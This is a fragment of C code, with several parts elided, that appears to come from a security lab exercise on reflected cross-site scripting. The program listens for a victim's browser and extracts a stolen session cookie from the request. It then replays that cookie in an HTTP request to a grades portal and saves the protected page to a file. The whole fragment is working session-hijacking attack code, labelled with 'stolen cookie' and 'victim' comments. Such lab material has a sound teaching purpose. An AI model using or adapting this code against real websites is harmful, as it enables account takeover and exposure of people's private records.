...
void extract_cookie(const char *request, char *cookie_out, size_t max_len) {
    const char *cookie_start = strstr(request, "/?"); // find the start of the cookie
    if (cookie_start) {
        cookie_start += 2; /* Skip "/?" */
        const char *cookie_end = strstr(cookie_start, " "); // find the end of the cookie
        if (cookie_end) {
            size_t len = (size_t)(cookie_end - cookie_start); // calculate length
            if (len < max_len) {
                strncpy(cookie_out, cookie_start, len); // copy cookie
                cookie_out[len] = '\0';
            }
        }
    }
...
int fetch_protected_page(const char *cookie, char *response_out, size_t max_len) {
    ...
    /* Construct HTTP GET request with stolen cookie AND User-Agent */
    snprintf(request, sizeof(request),
             "GET /gradesPortal.php HTTP/1.1\r\n"   // Target: gradesPortal.php
             "Host: %s\r\n"                         // Host header - WEB_SERVER_IP
             "Cookie: %s\r\n"                       // Stolen cookie    
...
int main(void) {
    ...
    /* Accept connection from victim's browser */
    ...
    /* Receive HTTP request with stolen cookie */
    memset(buffer, 0, sizeof(buffer));
    bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0'; // null terminate the buffer

        /* Send HTTP response to victim's browser */
        ...
        /* Fetch protected page using stolen cookie */
        memset(protected_page, 0, sizeof(protected_page));
        if (fetch_protected_page(cookie, protected_page, sizeof(protected_page)) == 0) {
            /* Save the protected page response to file */
            save_to_file("spoofed-reflected.txt", protected_page);
        }
    }
